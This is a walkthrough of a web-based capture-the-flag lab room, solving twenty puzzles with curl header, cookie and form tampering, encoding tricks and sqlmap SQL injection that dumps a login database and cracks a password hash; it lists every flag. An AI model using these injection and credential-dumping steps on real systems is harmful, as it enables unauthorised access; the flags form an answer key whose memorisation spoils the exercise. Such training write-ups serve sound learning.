# CTF collection Vol.2

Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.

Welcome, welcome and welcome to another CTF collection. This is the second installment of the CTF collection series. For your information, the second serious focuses on the web-based challenge. There are a total of 20 easter eggs a.k.a flags can be found within the box. Let see how good is your CTF skill.

Now, deploy the machine and collect the eggs!

Warning: The challenge contains seizure images and background. If you feeling uncomfortable, try removing the background on `<style>` tag.

Note: All the challenges flag are formatted as THM{flag}, unless stated otherwise

Fact: Eggs contain the highest quality protein you can buy.

# Recon

## Nmap

~~~
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 360 No Scope!
~~~

## directory reconnaissance

~~~
200 -   92KB - /
301 -  314B  - /login  ->  http://10.10.141.149/login/
200 -   92KB - /index
200 -   38KB - /button
403 -  285B  - /.hta
200 -  248KB - /static
200 -   61KB - /cat
200 -  689B  - /small
200 -    4MB - /who
200 -  430B  - /robots
200 -   19KB - /iphone
301 -  314B  - /game1  ->  http://10.10.141.149/game1/
200 -   25KB - /egg
200 -    1MB - /dinner
200 -  194KB - /ty
301 -  314B  - /ready  ->  http://10.10.141.149/ready/
200 -  153KB - /saw
301 -  314B  - /game2  ->  http://10.10.141.149/game2/
200 -  152KB - /wel
301 -  317B  - /free_sub  ->  http://10.10.141.149/free_sub/
200 -  359KB - /nicole
403 -  294B  - /server-status
~~~

# Easter 1

*Hint: Check the robots*

~~~
$ curl -s http://10.10.141.149/robots.txt
User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)
Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=


45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
~~~

Let's decode the hex string:

~~~
$ echo "45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d" | xxd -r -p
Easter 1: THM{4u70b07_r0ll_0u7}
~~~

Easter 1: `THM{4u70b07_r0ll_0u7}`

# Easter 2

*Hint: Decode the base64 multiple times. Don't forget there are something being encoded.*

From the `robots.txt` file, there is a hidden resource:

~~~
$ urldecode $(echo "VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=" | base64 -d) | base64 -d | sed "s/\ //g" | base64 -d | sed "s/\ //g" | base64 -d
DesKel_secret_base
~~~

Let's check what this is:

~~~
$ curl -s http://10.10.141.149/DesKel_secret_base/
<html>
	<head>
		<title> A slow clap for you</title>
		<h1 style="text-align:center;">A slow clap for you</h1>
	</head>
	
	<body>
	<p style="text-align:center;"><img src="kim.png"/></p>
	<p style="text-align:center;">Not bad, not bad.... papa give you a clap</p>
	<p style="text-align:center;color:white;">Easter 2: THM{f4ll3n_b453}</p>
	</body>

</html>
~~~

Easter 2: `THM{f4ll3n_b453}`

# Easter 3

*Hint: Directory buster with common.txt might help.*

Dirsearch found `/login/`. The page itself contains an easter egg:

~~~
$ curl -s http://10.10.141.149/login/
<!DOCTYPE html PUBLIC"-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"
<html>

	<head>
		<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
		<meta content="utf-8" http-equiv="encoding">
		<p hidden>Seriously! You think the php script inside the source code? Pfff.. take this easter 3: THM{y0u_c4n'7_533_m3}</p> 
		<title>Can you find the egg?</title>
		<h1>Just an ordinary login form!</h1>
	</head>
	
	<body>
		
		<p>You don't need to register yourself</p><br><br>
		<form method='POST'>
			Username:<br>
			<input type="text" name="username" required>
			<br><br>
			Password:<br>
			<input type="text" name="password" required>
			<br><br>
			<button name="submit" value="submit">Login</button>
		</form>

			</body>
</html>
~~~

Easter 3: `THM{y0u_c4n'7_533_m3}`

# Easter 4

*Hint: time-based sqli*

The `/login/` page was found by dirsearch. Let's check if fields are vulnerable to SQL injection. We'll first use Burp Suite to intercept a POST request to the login form, save it from the HTTP history as `login.xml` and provide SQL map with the XML file.

~~~
$ python /data/src/sqlmap-dev/sqlmap.py -r login.xml --current-db

[REDACTED]

[08:09:07] [INFO] retrieved: THM_f0und_m3
current database: 'THM_f0und_m3'
~~~

Now that we have the database, let's dump the tables:

~~~
$ python /data/src/sqlmap-dev/sqlmap.py -r login.xml -D THM_f0und_m3 --tables

[REDACTED]

Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+
~~~

Let's see the structure of the `nothing_inside` table:

~~~
$ python /data/src/sqlmap-dev/sqlmap.py -r login.xml -D THM_f0und_m3 -T nothing_inside --columns

[REDACTED]

Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+
~~~

Only 1 field, let's dump the table:

~~~
$ python /data/src/sqlmap-dev/sqlmap.py -r login.xml -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"

[REDACTED]

select Easter_4 from nothing_inside [1]:
[*] THM{1nj3c7_l1k3_4_b055}
~~~

Easter 4: `THM{1nj3c7_l1k3_4_b055}`

# Easter 5

*Hint: Another sqli*

Still using the same SQL injection as for easter 4, let's dump the user table:

~~~
$ python /data/src/sqlmap-dev/sqlmap.py -r login.xml -D THM_f0und_m3 -T user --columns

[REDACTED]

Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+
~~~

And now, let's dump the content:

~~~
$ python /data/src/sqlmap-dev/sqlmap.py -r login.xml -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"

[REDACTED]

select username,password from user [2]:
[*] DesKel, 05f3672ba34409136aa71b8d00070d1b
[*] Skidy, He is a nice guy, say hello for me
~~~

Search for the `05f3672ba34409136aa71b8d00070d1b` hash on Google, it corresponds to the following password: `cutie`

Now, let's authenticate with `Deskel:cutie`:

~~~
$ curl -s -d "username=DesKel&password=cutie&submit=submit" -X POST http://10.10.62.234/login/ | grep Easter
Easter 5: THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}	</body>
~~~

Easter 5: `THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}`

# Easter 6

*Hint: Look out for the response header.*

~~~
$ curl -s 10.10.141.149 -D header.txt
$ cat header.txt 
HTTP/1.1 200 OK
Date: Fri, 29 May 2020 21:34:04 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Set-Cookie: Invited=0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
~~~

Easter 6: `THM{l37'5_p4r7y_h4rd}`

# Easter 7

*Hint: Cookie is delicious*

When you visit the home page, you see the following title:

~~~
$ curl -s http://10.10.62.234/ | grep "Who are you"
			<h2> Who are you? Did I invite you?</h2>
~~~

From the header, we see that there is a cookie named `Invited` set to 0:

~~~
HTTP/1.1 200 OK
Date: Fri, 29 May 2020 21:34:04 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Set-Cookie: Invited=0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
~~~

Let's set `1` instead:

~~~
$ curl -s --cookie "Invited=1" http://10.10.62.234/ | grep "easter 7"
			<h2> You are now officially invited. Enjoy the easter 7: THM{w3lc0m3!_4nd_w3lc0m3} </h2>
~~~

Easter 7: `THM{w3lc0m3!_4nd_w3lc0m3}`

# Easter 8

*Hint: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1*

~~~
$ curl -s http://10.10.141.149/ | grep "Safari"
			<h4>You need Safari 13 on iOS 13.1.2 to view this message. If you are rich enough</h4>
~~~

~~~
$ curl -s --user-agent "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" http://10.10.141.149/ | grep "Easter 8"
			<h4>You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8: THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}
~~~

Easter 8: `THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}`

# Easter 9

*Hint: Something is redirected too fast. You need to capture it.*

~~~
$ curl -s http://10.10.141.149/ready/
<html>
	<head>
		<title>You just press it</title>
		<meta http-equiv="refresh" content="3;url=http:gone.php" />
		<p style="text-align:center"><img src="bye.gif"/></p>
		<!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{60nn4_60_f457} -->
	</head>

</html>
~~~

Easter 9: `THM{60nn4_60_f457}`

# Easter 10

*Hint: Look at THM URL without https:// and use it as a referrer.*

When we try to visit the `/free_sub/` page (link provided in the home page), we are told that only people coming from tryhackme are allowed:

~~~
$ curl -s http://10.10.141.149/free_sub/
only people came from tryhackme are allowed to claim the voucher.
~~~

Let's modify our referer:

~~~
$ curl -s --referer "tryhackme.com" http://10.10.62.234/free_sub/
Nah, there are no voucher here, I'm too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{50rry_dud3}
~~~

Easter 10: `THM{50rry_dud3}`

# Easter 11

*Hint: Temper the html*

There is a dropdown on the main page, in the menu section. It allows to choose between salad, sandwich, tyre or DesKel.

```html
$ curl -s http://10.10.62.234/ | grep menu -B 1 -A 10
	<img src="dinner.gif"/>
	<h2>Let see the menu, huh..............</h2>
	<form method="POST">
	<select name="dinner">
		 <option value="salad">salad</option>
  		 <option value="chicken sandwich">chicken sandwich</option>
  		 <option value="tyre">tyre</option>
  		 <option value="DesKel">DesKel</option>
      	</select>
	 <br><br><br>
                 <button name="submit" value="submit">Take it!</button>
	</form>
```

If you choose salad for example, you will be told to choose an egg instead, but egg is not on the list.

```html
$ curl -s -d "dinner=salad" -X POST http://10.10.62.234/ | grep menu -B 1 -A 12
	<img src="dinner.gif"/>
	<h2>Let see the menu, huh..............</h2>
	<form method="POST">
	<select name="dinner">
		 <option value="salad">salad</option>
  		 <option value="chicken sandwich">chicken sandwich</option>
  		 <option value="tyre">tyre</option>
  		 <option value="DesKel">DesKel</option>
      	</select>
	 <br><br><br>
                 <button name="submit" value="submit">Take it!</button>
	</form>

	Mmmmmm... what a healthy choice, I prefer an egg	<h1 style="color:red"">Press this button if you wishes to watch the world burn!!!!!!!!!!!!!!!!<h1>
```

Oh, you prefer eggs? No problem...

```html
$ curl -s -d "dinner=egg" -X POST http://10.10.62.234/ | grep menu -B 1
	<img src="dinner.gif"/>
	<h2>Let see the menu, huh..............</h2>
--

	You found the secret menu, take the easter 11: THM{366y_b4k3y}	<h1 style="color:red"">Press this button if you wishes to watch the world burn!!!!!!!!!!!!!!!!<h1>
```

Easter 11: `THM{366y_b4k3y}`

# Easter 12

*Hint: Fake js file*

A Javscript file is included in the home page:

```html
$ curl -s http://10.10.62.234/ | grep "\.js"
		<script src="jquery-9.1.2.js"></script>
```

But this is a *fake* jquery:

```javascript
$ curl -s http://10.10.62.234/jquery-9.1.2.js
function ahem()
 {
	str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
	var hex  = str1.toString();
	var str = '';
	for (var n = 0; n < hex.length; n += 2) {
		str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
	}
	return str;
 }
````

Just call the function `ahem()` in a Javascript interpreter (e.g. http://math.chapman.edu/~jipsen/js/):

```javascript
function ahem()
 {
	str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
	var hex  = str1.toString();
	var str = '';
	for (var n = 0; n < hex.length; n += 2) {
		str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
	}
	return str;
 }
write(ahem());
````

It will return the flag.

Easter 12: `THM{h1dd3n_j5_f1l3}`

# Easter 13

The page discovered at easter #9 redirects to `/ready/gone.php`, which contains the flag:

~~~
$ curl -s http://10.10.141.149/ready/gone.php
<html>
		<title>Congratulation</title>
		<h1 style="text-align:center">Congratulation!You just ended the world</h1>
		<p style="text-align:center"><img src="bomb.gif"></p><br><br>
		<p style="text-align:center">Happy? Take the egg now. Easter 13: THM{1_c4n'7_b3l13v3_17}</p>
</html>
~~~

Easter 13: `THM{1_c4n'7_b3l13v3_17}`

# Easter 14

*Hint: Embed image code*

Fire up Burp Suite and intercept the response (Proxy > Options > Intercept Server Responses). Go to the main page and modify the source code to remove the comment around Easter 14 so that the base64-encoded image is displayed:

~~~
<h2>Did you know: During your lifetime, you will produce enough saliva to fill two swimming pools.</h2>
	<!--Easter 14<img src="data:image/png;base64,iVBORw0KGgoAAAANS[REDACTED]
~~~

It will reveal the flag:

!["easter14.png"](files/easter14.png)

Easter 14: `THM{d1r3c7_3mb3d}`

# Easter 15

*Hint: Try guest the alphabet and the hash code*

When we connect to `/game1/` (found by dirsearch), we are prompted for a combination, and we see a hash proposed as hint:

~~~
$ curl -s http://10.10.141.149/game1/
<html>
	<head>
		<title>Game 1</title>
		<h1>Guess the combination</h1>
	</head>
	
	<body>
	<form method="POST">
		Your answer:<br>
		<input type="text" name="answer" required>
	</form>
		<p>Your hash: </p>
	<p>hints: 51 89 77 93 126 14 93 10 </p>
	</body>

</html>
~~~

If we post the alphabet, we have the correspondance of numerical values. Let's do it for the upper case letters:

~~~
$ curl -d "answer=ABCDEFGHIJKLMNOPQRSTUVWXYZ" -X POST http://10.10.141.149/game1/
<html>
	<head>
		<title>Game 1</title>
		<h1>Guess the combination</h1>
	</head>
	
	<body>
	<form method="POST">
		Your answer:<br>
		<input type="text" name="answer" required>
	</form>
		<p>Your hash:  99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 140 141</p>
	<p>hints: 51 89 77 93 126 14 93 10 </p>
	</body>

</html>
~~~

And also for the lower case letters:

~~~
$ curl -d "answer=abcdefghijklmnopqrstuvwxyz" -X POST http://10.10.141.149/game1/
<html>
	<head>
		<title>Game 1</title>
		<h1>Guess the combination</h1>
	</head>
	
	<body>
	<form method="POST">
		Your answer:<br>
		<input type="text" name="answer" required>
	</form>
		<p>Your hash:  89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18</p>
	<p>hints: 51 89 77 93 126 14 93 10 </p>
	</body>

</html>
~~~

We now have the numbers associated to each upper (99=A, 100=B, 101=C, ... 141=Z) and lower (89=a, 90=b, ..., 18=z) and we can now decode the message:

~~~
51 89 77 93 126 14 93 10
G  a  m  e  O   v  e  r
~~~

Let's post our answer to get the flag:

~~~
$ curl -d "answer=GameOver" -X POST http://10.10.141.149/game1/
<html>
	<head>
		<title>Game 1</title>
		<h1>Guess the combination</h1>
	</head>
	
	<body>
	<form method="POST">
		Your answer:<br>
		<input type="text" name="answer" required>
	</form>
	Good job on completing the puzzle, Easter 15: THM{ju57_4_64m3}	<p>Your hash:  51 89 77 93 126 14 93 10</p>
	<p>hints: 51 89 77 93 126 14 93 10 </p>
	</body>

</html>
~~~

Easter 15: `THM{ju57_4_64m3}`

# Easter 16

*Hint: Make all inputs into one form.*

The page has 3 forms whose action points to the same page, using the same method (POST), each containing a button.

~~~
$ curl -s http://10.10.141.149/game2/
<html>
        <head>
                <title>Game 2</title>
                <h1>Press the button simultaneously</h1>
        </head>
	<body>
	
	<form method="POST">
		<input type="hidden" name="button1" value="button1">
		<button name="submit" value="submit">Button 1</button>
	</form>

	<form method="POST">
                <input type="hidden" name="button2" value="button2">
                <button name="submit" value="submit">Button 2</button>
        </form>

	<form method="POST">
                <input type="hidden" name="button3" value="button3">
                <button name="submit" value="submit">Button 3</button>
        </form>
		</body>
</html>
~~~

It is not possible to push all the buttons in the same time. However, we can send all the values in POST to the page. The server will *think* that the buttons have all been clicked:

~~~
unknown@localhost:/data/documents/challenges/TryHackMe/CTF_collection_Vol.2/tmp$ curl -d "button1=button1&button2=button2&button3=button3" -X POST http://10.10.141.149/game2/
<html>
        <head>
                <title>Game 2</title>
                <h1>Press the button simultaneously</h1>
        </head>
	<body>
	
	<form method="POST">
		<input type="hidden" name="button1" value="button1">
		<button name="submit" value="submit">Button 1</button>
	</form>

	<form method="POST">
                <input type="hidden" name="button2" value="button2">
                <button name="submit" value="submit">Button 2</button>
        </form>

	<form method="POST">
                <input type="hidden" name="button3" value="button3">
                <button name="submit" value="submit">Button 3</button>
        </form>
	Just temper the code and you are good to go. Easter 16: THM{73mp3r_7h3_h7ml}	</body>
</html>
~~~

Easter 16: `THM{73mp3r_7h3_h7ml}`

# Easter 17

*Hint: bin -> dec -> hex -> ascii*

From the source code of the main page:

~~~
<!--! Easter 17-->
<button onclick="nyan()">Mulfunction button</button><br>
<p id="nyan"></p>
<script>
function catz(){
    	document.getElementById("nyan").innerHTML = "100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101"
}
</script>
~~~

Let's solve that in python:

```python
>>> b = '100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101'
>>> d = int(b, 2)
>>> d
31381767556396068451396213107418146737161460075387838039325522269201190105981
>>> h = hex(d)[2:]
>>> h
'4561737465722031373a2054484d7b6a355f6a355f6b33705f6433633064337d'
>>> bytes.fromhex(h).decode('ASCII')
'Easter 17: THM{j5_j5_k3p_d3c0d3}'
```

Easter 17: `THM{j5_j5_k3p_d3c0d3}`

# Easter 18

*Hint: Request header. Format is egg:Yes*

~~~
$ curl -s -H "egg: Yes" http://10.10.62.234/ | grep -i "Easter 18"
	That's it, you just need to say YESSSSSSSSSS. Easter 18: THM{70ny_r0ll_7h3_366}	<img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/>
~~~

Easter 18: `THM{70ny_r0ll_7h3_366}`

# Easter 19

*Hint: A thick dark line*

~~~
$ wget http://10.10.141.149/small
$ file small.png 
small.png: PNG image data, 900 x 100, 4-bit colormap, non-interlaced
~~~

The file contains the easter:

!["small.png"](files/small.png)

Easter 19: `THM{700_5m4ll_3yy}`

# Easter 20

*Hint: You need to POST the data instead of GET. Burp suite or curl might help.*

From the source code of the main page:

~~~
$ curl -s http://10.10.62.234/ | grep "easter 20"
	<h3> Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.</h3>
~~~

Now, if we send the username and password using the POST method to the main page, we are provided with the easter egg:

~~~
$ curl -s -d "username=DesKel&password=heIsDumb" -X POST http://10.10.62.234/ | grep -A1 "easter 20"
	<h3> Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.</h3>
	Okay, you pass, Easter 20: THM{17_w45_m3_4ll_4l0n6}	<br><br><br>
~~~

Easter 20: `THM{17_w45_m3_4ll_4l0n6}`